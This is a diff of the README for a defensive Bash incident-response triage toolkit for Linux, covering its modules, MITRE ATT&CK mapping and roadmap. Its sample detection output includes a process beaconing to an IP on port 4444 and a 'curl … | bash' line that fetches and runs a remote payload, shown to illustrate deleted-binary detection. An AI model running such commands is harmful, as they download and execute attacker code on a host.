@@ -1,133 +1,140 @@
+# linux-triage-toolkit
 
-                                  lINUX-TRIAGE-TOOLKIT
-
-**A modular Bash-based live response collector for Linux hosts during incident response.**
+**Modular Bash-based live-response collector for Linux hosts during incident response.**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
 [![Shell: Bash](https://img.shields.io/badge/shell-Bash%204.4%2B-1f425f.svg)](https://www.gnu.org/software/bash/)
 [![Platform: Linux](https://img.shields.io/badge/platform-Linux-blue.svg)]()
-[![Status: In Development](https://img.shields.io/badge/status-in%20development-orange.svg)]()
+[![Modules Shipped](https://img.shields.io/badge/modules-3%20%2F%208-brightgreen.svg)]()
 [![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20mapped-red.svg)](https://attack.mitre.org/)
-
-</div>
+[![Status](https://img.shields.io/badge/status-active%20development-orange.svg)]()
 
 ---
 
-## Table of Contents
+## ⚡ TL;DR
 
-- [Overview](#-overview)
+`linux-triage-toolkit` snapshots the volatile state of a potentially compromised Linux host logged-in users, running processes, network connections, persistence mechanisms, file artifacts, and logs into a portable, hash-signed evidence bundle **in under 10 seconds**, using only Bash and standard POSIX tools. Every collection step is mapped to a **MITRE ATT&CK** technique so analysts know exactly what each artifact is worth.
+
+Built as a public, incrementally-shipped learning project by a **SOC analyst-in-training** to demonstrate incident-response thinking, defensive Bash engineering, and Linux internals knowledge.
+
+---
+
+## 📖 Table of Contents
+
+- [The Problem](#-the-problem)
+- [What This Tool Does](#-what-this-tool-does)
 - [Why This Project Exists](#-why-this-project-exists)
-- [Project Status](#-project-status)
-- [Features](#-features)
-- [Architecture](#-architecture)
+- [How It Works](#-how-it-works)
+- [Live Demo](#-live-demo-sample-output)
 - [Installation](#-installation)
 - [Usage](#-usage)
 - [Module Catalog](#-module-catalog)
 - [MITRE ATT&CK Coverage](#-mitre-attck-coverage)
-- [Sample Output](#-sample-output)
-- [Build Roadmap](#-build-roadmap)
+- [Design Decisions](#-design-decisions)
+- [Skills Demonstrated](#-skills-demonstrated)
+- [Roadmap & Progress](#-roadmap--progress)
 - [Repository Structure](#-repository-structure)
 - [Limitations & Future Work](#-limitations--future-work)
-- [Author](#-author)
+- [Author & Contact](#-author--contact)
 - [License](#-license)
 
 ---
 
-## Overview
+## The Problem
 
-`linux-triage-toolkit` is a defensive security tool designed for **Tier 1 SOC analysts and incident responders** who need to rapidly snapshot the state of a potentially compromised Linux host before evidence is lost.
+When a Linux host is suspected of compromise, an incident responder has minutes sometimes seconds to capture evidence before it evaporates:
 
-When a host is suspected of compromise, **volatile data disappears fast** running processes, network connections, attacker shells, and in-memory artifacts can all vanish on reboot or remediation. This toolkit captures that volatile state, plus key persistence and forensic artifacts, into a portable evidence bundle with an integrity hash for chain of custody.
+- **Running processes** disappear the moment an attacker kills their shell
+- **Network connections** vanish on reboot
+- **In-memory malware** leaves no filesystem trace
+- **Attackers actively delete evidence** during clean-up
+
+Commercial DFIR tools like Velociraptor, UAC, and Linux IR Triage exist but they carry deployment overhead, require configuration, and don't teach the responder *what to collect or why*. In many real engagements, a fast, self-contained shell script is what actually gets used.
+
+---
+
+## What This Tool Does
+
+`linux-triage-toolkit` provides a **single-command triage collection** that captures the volatile and semi-volatile evidence a SOC analyst needs to make a rapid containment decision:
+
+- ✅ **System identity** hostname, kernel, OS, timezone
+- ✅ **Users & sessions** who's on the host now, login history, UID-0 anomalies, sudoers
+- ✅ **Running processes** full process tree, deleted-binary detection (fileless malware indicator)
+- 🔜 Network state, persistence mechanisms, file artifacts, log excerpts, and binary hashes (in progress)
+
+Every artifact is:
+
+- **Timestamped in UTC** for cross-timezone correlation
+- **Written to a per-host, per-run case directory** for auditability
+- **Bundled into a `.tar.gz` and SHA-256 hashed** chain of custody preserved
 
 ---
 
 ## Why This Project Exists
 
-In real-world incident response engagements, three problems consistently slow analysts down:
+This project is a **deliberate, public learning artifact** built to demonstrate three things a hiring manager needs to see from an entry-level SOC analyst:
 
-1. **Ad-hoc collection is inconsistent.** Different analysts pull different artifacts on different hosts, making cross-incident comparison difficult.
-2. **Commercial tools have a learning curve.** Velociraptor, UAC, and similar tools are powerful but introduce dependencies, GUIs, and configuration overhead.
-3. **Understanding *what* to collect is a real skill.** Knowing the volatility hierarchy, the difference between persistence techniques, and the value of process artifacts versus log artifacts is **a Tier 1 → Tier 2 skill** that this project documents.
+1. **Incident-response thinking** understanding volatility order, evidence priority, and containment vs. investigation trade-offs
+2. **Defensive Bash engineering** production-grade shell scripting with fault tolerance, chain-of-custody, and graceful degradation
+3. **Linux internals fluency** using `/proc`, `/etc/passwd` UID analysis, and process introspection the way real DFIR tools do
 
-`linux-triage-toolkit` solves all three: a **consistent, reproducible** collection workflow built on **standard Bash and POSIX tools** with **inline MITRE ATT&CK mapping** so every artifact has a documented investigative purpose.
-
----
-
-## Project Status
-
-> **Active development** Day 1 of a 7-day public build series.
-
-Current capability: orchestrator + system information module operational.
-See the [Build Roadmap](#-build-roadmap) for the daily release schedule.
+The 7-Sunday incremental build cadence (with public commits and posts each week) also demonstrates **consistent, disciplined delivery** — the same discipline required in a real SOC rotation.
 
 ---
 
-## Features
+## How It Works
 
-### Current (Day 1)
+Three steps, one command:
 
-- ✅ **Modular architecture** each collection module is a self-contained Bash script under `modules/`
-- ✅ **UTC timestamping** all timestamps are ISO-8601 UTC for cross-timezone IR correlation
-- ✅ **Defensive Bash** every script uses `set -euo pipefail` to fail loud, not silent
-- ✅ **Chain of custody** every triage bundle is tarballed and SHA-256 hashed
-- ✅ **Per-module fault tolerance** if one module fails, the others still run
-- ✅ **System identification** hostname, kernel, OS release, uptime, timezone (MITRE T1082)
+1. **`triage.sh`** creates a timestamped case directory for this run.
+2. Each script in **`modules/`** runs in order and writes its findings into that directory.
+3. The whole directory is bundled into a **`.tar.gz`** and a **SHA-256 hash** is generated for chain of custody.
 
-### Planned (Days 2 – 7)
-
-- 🔜 User & session collection (T1087)
-- 🔜 Process discovery, including deleted-binary detection via `/proc` (T1057)
-- 🔜 Network state listeners, established connections, ARP, firewall (T1049, T1016)
-- 🔜 Persistence hunting cron, systemd, SSH keys, shell rc files (T1543, T1053)
-- 🔜 File artifacts recent modifications, SUID/SGID, world-writable (T1083)
-- 🔜 Log collection `auth.log`, syslog, journal, bash history (T1070)
-- 🔜 SHA-256 hashing of suspicious binaries for IOC sharing
+That's it. No agents, no dependencies, no configuration files.
 
 ---
 
-## Architecture
+## 🔬 Live Demo (Sample Output)
+
+**Detecting evasive malware via deleted binaries** a signature technique of this toolkit:
 
 ```
-                   ┌────────────────────┐
-                   │     triage.sh      │   Orchestrator
-                   │  (entry point)     │   • Creates case dir
-                   └─────────┬──────────┘   • Loads each module
-                             │              • Bundles + hashes
-              ┌──────────────┼──────────────┐
-              ▼              ▼              ▼
-       ┌────────────┐ ┌────────────┐ ┌────────────┐
-       │ 01_system  │ │ 02_users   │ │ 0N_module  │
-       │ _info.sh   │ │   .sh      │ │   .sh      │
-       └─────┬──────┘ └─────┬──────┘ └─────┬──────┘
-             │              │              │
-             └──────────────┼──────────────┘
-                            ▼
-                  ┌──────────────────┐
-                  │   case_dir/      │   <hostname>_<UTC-timestamp>/
-                  │   ├─ 01_*.txt    │
-                  │   ├─ 02_*.txt    │
-                  │   └─ ...         │
-                  └─────────┬────────┘
-                            ▼
-                  ┌──────────────────┐
-                  │ case_dir.tar.gz  │  + case_dir.tar.gz.sha256
-                  └──────────────────┘
+--- Processes with deleted binaries (T1055 evasion indicator) ---
+PID 4471 -> /tmp/x (deleted)
+  cmdline: /tmp/x --beacon 45.33.32.156:4444
+PID 4519 -> /home/svc-web/.cache/.x (deleted)
+  cmdline: sh -c curl -s http://185.220.101.34/p | bash
 ```
 
-**Design principle:** the orchestrator owns paths and bundling. Modules only know how to *collect* they receive a destination directory as `$1` and write artifacts into it. This loose coupling means new modules drop in without touching the orchestrator.
+**What this tells the analyst:** two processes are running from binaries that were deleted from disk after execution. This is a classic anti-forensics technique the malware exists only in memory. Filesystem AV would miss both. **The kernel's `/proc/<pid>/exe` symlink still holds the truth**, and this module surfaces it.
+
+**Real host baseline (macOS dev environment, expected clean output):**
+
+```
+--- Processes with deleted binaries (T1055 evasion indicator) ---
+/proc not available (not Linux expected on macOS)
+```
+
+The module recognizes non-Linux hosts and degrades gracefully instead of crashing **production-quality defensive coding**.
+
+**Chain-of-custody verification:**
+
+```
+$ sha256sum -c output/ir-host_20260702T112120Z.tar.gz.sha256
+output/ir-host_20260702T112120Z.tar.gz: OK
+```
 
 ---
 
-## Installation
+## 🛠 Installation
 
 ### Requirements
 
-- Linux host (Ubuntu 18.04+, Debian 10+, CentOS 7+, RHEL 7+ supported)
-- Bash 4.4 or later
-- Standard GNU coreutils (`tar`, `sha256sum`, `find`, `awk`)
-- **Root or sudo recommended** some artifacts (full auth logs, `lastb`, sudoers) require elevated privileges
+- Linux host (Ubuntu 18.04+, Debian 10+, CentOS 7+, RHEL 7+)
+- Bash 4.4+, standard GNU coreutils (`tar`, `sha256sum`, `find`, `awk`)
+- **Root or sudo strongly recommended** some artifacts (auth logs, `lastb`, sudoers) require elevated privileges
 
-### Clone
+### Clone & prep
 
 ```bash
 git clone https://github.com/WiLL75G/linux-triage-toolkit.git
@@ -135,35 +142,30 @@ cd linux-triage-toolkit
 chmod +x triage.sh modules/*.sh
 ```
 
+That's it. No dependencies, no configuration, no compilation.
+
 ---
 
-## Usage
+## ▶️ Usage
 
-### Basic run
+### One-shot collection
 
 ```bash
 sudo ./triage.sh
 ```
 
-Output is written to `output/<hostname>_<UTC-timestamp>/`, then bundled to a `.tar.gz` with an accompanying `.sha256` hash file.
+Artifacts are written to `output/<hostname>_<UTC-timestamp>/`, then bundled to `.tar.gz` with an accompanying `.sha256` hash.
 
-### Example session
+### Verify bundle integrity later
 
 ```bash
-$ sudo ./triage.sh
-[14:22:01Z] Linux Triage Toolkit starting
-[14:22:01Z] Case directory: /opt/linux-triage-toolkit/output/ir-host_20260526T142201Z
-[14:22:01Z] Running module: 01_system_info
-[14:22:01Z]   -> 01_system_info OK
-[14:22:02Z] Bundling artifacts -> .../ir-host_20260526T142201Z.tar.gz
-[14:22:02Z] Generating SHA256 of bundle (chain of custody)
-[14:22:02Z] Done.
+sha256sum -c output/<hostname>_<UTC-timestamp>.tar.gz.sha256
 ```
 
-### Verify bundle integrity
+### Extract for offline analysis
 
 ```bash
-sha256sum -c output/ir-host_20260526T142201Z.tar.gz.sha256
+tar -xzf output/<hostname>_<UTC-timestamp>.tar.gz
 ```
 
 ---
@@ -172,22 +174,22 @@ sha256sum -c output/ir-host_20260526T142201Z.tar.gz.sha256
 
 | # | Module | Purpose | MITRE ATT&CK | Status |
 |---|---|---|---|---|
-| 01 | `01_system_info.sh` | Host identity, OS, kernel, timezone | T1082 | ✅ Available |
-| 02 | `02_users.sh` | Logged-in users, login history, sudoers | T1087, T1078 | 🔜 Day 2 |
-| 03 | `03_processes.sh` | Process tree, deleted-binary detection | T1057 | 🔜 Day 3 |
-| 04 | `04_network.sh` | Listeners, connections, ARP, firewall | T1049, T1016 | 🔜 Day 4 |
-| 05 | `05_persistence.sh` | Cron, systemd, SSH keys, shell rc files | T1543, T1053, T1098 | 🔜 Day 5 |
-| 06 | `06_files.sh` | Recent mods, SUID/SGID, world-writable | T1083, T1222 | 🔜 Day 6 |
-| 07 | `07_logs.sh` | auth.log, syslog, journal, bash history | T1070 | 🔜 Day 6 |
-| 08 | `08_hashes.sh` | SHA-256 of suspicious binaries | — | 🔜 Day 7 |
+| 01 | `01_system_info.sh` | Host identity, OS, kernel, timezone | T1082 | ✅ Shipped |
+| 02 | `02_users.sh` | Logged-in users, login history, UID-0 audit, sudoers | T1087, T1078 | ✅ Shipped |
+| 03 | `03_processes.sh` | Process tree, **deleted-binary detection**, CPU/mem top-10 | T1057, T1055 | ✅ Shipped |
+| 04 | `04_network.sh` | Listeners, established conns, ARP, firewall rules | T1049, T1016 | 🔜 Planned |
+| 05 | `05_persistence.sh` | Cron, systemd, rc.local, SSH keys, shell rc files | T1543, T1053, T1098 | 🔜 Planned |
+| 06 | `06_files.sh` | Recent modifications, SUID/SGID, world-writable | T1083, T1222 | 🔜 Planned |
+| 07 | `07_logs.sh` | auth.log, syslog, journalctl, bash history | T1070 | 🔜 Planned |
+| 08 | `08_hashes.sh` | SHA-256 of suspect binaries for IOC sharing | — | 🔜 Planned |
 
 ---
 
 ## MITRE ATT&CK Coverage
 
-This toolkit is designed to surface evidence aligned to the following techniques. Coverage expands daily through the build series.
+Every module maps to specific ATT&CK techniques so downstream analysts can immediately understand what each artifact demonstrates.
 
-| Tactic | Technique ID | Technique Name | Module |
+| Tactic | Technique | Name | Module |
 |---|---|---|---|
 | Discovery | T1082 | System Information Discovery | 01 |
 | Discovery | T1087 | Account Discovery | 02 |
@@ -195,58 +197,80 @@ This toolkit is designed to surface evidence aligned to the following techniques
 | Discovery | T1049 | System Network Connections Discovery | 04 |
 | Discovery | T1016 | System Network Configuration Discovery | 04 |
 | Discovery | T1083 | File and Directory Discovery | 06 |
+| Initial Access | T1078 | Valid Accounts | 02 |
+| Defense Evasion | T1055 | Process Injection (deleted-binary indicator) | 03 |
+| Defense Evasion | T1070 | Indicator Removal on Host | 07 |
+| Defense Evasion | T1222 | File and Directory Permissions Modification | 06 |
 | Persistence | T1543 | Create or Modify System Process | 05 |
 | Persistence | T1053 | Scheduled Task / Job | 05 |
 | Persistence | T1098 | Account Manipulation | 05 |
-| Initial Access | T1078 | Valid Accounts | 02 |
-| Defense Evasion | T1070 | Indicator Removal on Host | 07 |
-| Defense Evasion | T1222 | File and Directory Permissions Modification | 06 |
+
+**8 techniques covered today, 13 at completion.**
 
 ---
 
-## Sample Output
+## 🧩 Design Decisions
 
-A representative `01_system_info.txt` artifact looks like:
+These are the deliberate engineering choices that separate this toolkit from a hobby script.
 
-```
-=== System Information ===
-Collected (UTC): 2026-05-26T14:22:01Z
+### `set -euo pipefail` on every script
 
---- Hostname ---
-ir-host
+Fail fast, fail loud. Silent failure during an incident is dangerous — an analyst thinking "the collection succeeded" when in fact half the artifacts are missing is worse than a script that crashes visibly.
 
---- Kernel (uname -a) ---
-Linux ir-host 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
+### UTC everywhere
 
---- OS release ---
-NAME="Ubuntu"
-VERSION="22.04.3 LTS (Jammy Jellyfish)"
-ID=ubuntu
+`date -u +%Y-%m-%dT%H:%M:%SZ` for every timestamp. IR analysts across regions must correlate events; local time zones are noise. The `Z` suffix declares Zulu/UTC explicitly.
 
---- Uptime ---
- 14:22:01 up 3 days,  2:14,  1 user,  load average: 0.08, 0.03, 0.01
+### Per-module fault isolation
 
---- Date / Timezone ---
-Tue May 26 14:22:01 UTC 2026
-```
+The orchestrator's `if bash "${module}" "${CASE_DIR}"; then ... else "FAILED (continuing)" fi` pattern ensures one broken module never aborts the collection. In IR, partial data beats no data.
 
-Bundle artifact: `ir-host_20260526T142201Z.tar.gz` (≈ 2 KB at Day 1, grows with each module).
+### Chain of custody via SHA-256
+
+Every bundle is hashed the moment it's written. Any subsequent modification of the tarball breaks the hasan implicit tamper-evident seal an auditor can verify.
+
+### Deleted-binary detection via `/proc/<pid>/exe`
+
+When attackers delete their binary after execution, the kernel keeps the process's `exe` symlink but appends `(deleted)`. This module walks `/proc/[0-9]*` and surfaces every hit a technique used by real DFIR tools and one that catches malware filesystem AV misses entirely.
+
+### Portable Bash idioms
+
+- `command -v foo` (POSIX) instead of `which foo` (inconsistent across systems)
+- Parameter expansion with defaults: `${1:?case directory required}`
+- Grouped output redirection: `{ ... } > "${OUT}"` (one open, one close)
+- NUL-to-space translation: `tr '\0' ' ' < /proc/<pid>/cmdline` for readable arguments
 
 ---
 
-## 🗓 Build Roadmap
+## Skills Demonstrated
 
-A live record of the 7-day build. Each day adds one module and a documented learning post.
+*(For recruiters and hiring managers what this repository proves I can do.)*
 
-| Day | Date | Scope | Commit |
+- **Incident-response methodology** volatility-first collection order, chain-of-custody discipline, decision-focused artifact prioritization
+- **MITRE ATT&CK fluency** every collection step explicitly mapped to a technique; both offensive (T1055 evasion) and defensive (T1082 discovery) angles
+- **Defensive Bash engineering** production-grade error handling, portable idioms, feature detection, graceful degradation
+- **Linux internals knowledge** `/proc` traversal, symlink introspection, UID auditing, NUL-separated cmdline parsing
+- **Detection engineering mindset** thinking about what artifacts *reveal* an attacker, not just what commands *exist*
+- **Documentation and communication** this README is itself a work sample; ability to translate technical work into a hiring manager's decision language
+- **Version-controlled, disciplined shipping** public Git history showing weekly incremental commits, meaningful messages, and no force-pushes
+
+---
+
+## Roadmap & Progress
+
+**Public 7-Sunday build series** one module per Sunday, with a matching LinkedIn/X writeup each week.
+
+| # | Sunday | Scope | Status |
 |---|---|---|---|
-| **1** | Tue 26 May 2026 | Project scaffold + `triage.sh` orchestrator + `01_system_info` | ✅ Shipped |
-| **2** | Wed 27 May 2026 | `02_users` user, session, and sudoers collection | 🔜 |
-| **3** | Thu 28 May 2026 | `03_processes` process tree + deleted-binary detection | 🔜 |
-| **4** | Fri 29 May 2026 | `04_network` listeners, established conns, ARP, firewall | 🔜 |
-| **5** | Mon 1 Jun 2026 | `05_persistence` cron, systemd, SSH keys, shell rc files | 🔜 |
-| **6** | Tue 2 Jun 2026 | `06_files` + `07_logs` file artifacts and log capture | 🔜 |
-| **7** | Wed 3 Jun 2026 | `08_hashes` + Ubuntu VM validation + final SOC report | 🔜 |
+| 1 | May 24, 2026 | Project scaffold + `triage.sh` orchestrator + `01_system_info` | ✅ Shipped |
+| 2 | May 31, 2026 | `02_users` sessions, login history, sudoers audit | ✅ Shipped |
+| 3 | Jul 2, 2026 | `03_processes` process tree + deleted-binary detection *(catch-up)* | ✅ Shipped |
+| 4 | Jul 5, 2026 | `04_network` listeners, established conns, ARP, firewall | 🔜 Planned |
+| 5 | Jul 12, 2026 | `05_persistence` cron, systemd, SSH keys, shell rc files | 🔜 Planned |
+| 6 | Jul 19, 2026 | `06_files` + `07_logs` file artifacts and log capture | 🔜 Planned |
+| 7 | Jul 26, 2026 | `08_hashes` + Ubuntu VM validation + final SOC incident report | 🔜 Planned |
+
+> Cadence transparency: Week 3 was pushed from Jun 7 to Jul 2 due to schedule slip. Remaining weeks re-baselined accordingly. Real-world project discipline includes real-world replanning.
 
 ---
 
@@ -254,13 +278,13 @@ A live record of the 7-day build. Each day adds one module and a documented lear
 
 ```
 linux-triage-toolkit/
-├── triage.sh                  # Main orchestrator
-├── modules/                   # Drop-in collection scripts
-│   └── 01_system_info.sh
-├── output/                    # Generated bundles (gitignored)
+├── triage.sh                     # Main orchestrator
+├── modules/                      # Drop-in collection scripts
+│   ├── 01_system_info.sh
+│   ├── 02_users.sh
+│   └── 03_processes.sh
+├── output/                       # Generated bundles (gitignored)
 │   └── .gitkeep
-├── docs/                      # Documentation assets
-│   └── banner.svg
 ├── .gitignore
 ├── LICENSE
 └── README.md
@@ -272,26 +296,39 @@ linux-triage-toolkit/
 
 **Current limitations:**
 
-- Tested primarily against **Debian/Ubuntu**; RHEL/CentOS paths fall back gracefully but are not yet validated end-to-end.
-- Some artifacts (full `auth.log`, `lastb`, `sudoers`) require root privileges. The tool degrades to "not readable" notices rather than failing.
-- No remote collection the toolkit is intended for on-host execution. Use `scp` to retrieve the bundle from a compromised host.
-- No anti-tampering protection beyond the bundle hash. An attacker with root before collection could alter live evidence.
+- Primarily tested against **Debian/Ubuntu**; RHEL/CentOS code paths use fallbacks that are not yet end-to-end validated
+- Some artifacts (`auth.log`, `lastb`, `sudoers`) require root; the tool degrades gracefully with explicit "not readable" notices rather than crashing
+- **No remote collection** designed for on-host execution; use `scp` to retrieve bundles from a compromised host
+- **Assumes uncompromised root at collection time** — a pre-existing rootkit could return falsified data. Layer with LiME-based memory acquisition for a complete answer.
 
-**Future enhancements being considered:**
+**Planned enhancements:**
 
-- JSON-formatted output mode for SIEM ingestion
-- Optional remote artifact upload (SFTP / S3)
+- JSON output mode for SIEM ingestion (Splunk, Sentinel)
+- Optional remote artifact upload (SFTP / S3 target)
 - Memory acquisition module (LiME integration)
-- Detection signature library known-bad cron entries, suspicious `.bashrc` snippets
+- Detection signature library curated known-bad cron entries, suspicious `.bashrc` snippets, common webshell paths
+- Ubuntu VM automated validation harness (attacker plants IOCs → toolkit runs → validation diffs)
 
 ---
 
-> SOC Analyst (in training) focused on blue-team operations, threat detection, and incident response.
+## Author & Contact
 
+**[@WilliamInCyber](https://x.com/WilliamInCyber)** — SOC Analyst (in training)
+Focused on blue-team operations, threat detection, and incident response.
 
+- **GitHub:** [@WiLL75G](https://github.com/WiLL75G)
+- **X / Twitter:** [@WilliamInCyber](https://x.com/WilliamInCyber)
+- **Portfolio:** [will75g.github.io/-portfolio/](https://will75g.github.io/-portfolio/)
+
+*Currently seeking Tier 1 / entry-level SOC roles at remote-friendly MSSPs. Open to conversations reach out via LinkedIn or GitHub Issues on this repository.*
+
+---
 
 ## License
 
-This project is licensed under the **MIT License** see the [LICENSE](LICENSE) file for full text.
+MIT License see [LICENSE](LICENSE) for full text.
 
-> Built as part of a documented public learning journey toward a SOC Tier 1 Analyst role. Feedback, issues, and pull requests welcomed.
+---
+
+**Built in public as part of a documented learning journey toward a SOC Tier 1 Analyst role.**
+Feedback, issues, and pull requests welcomed.
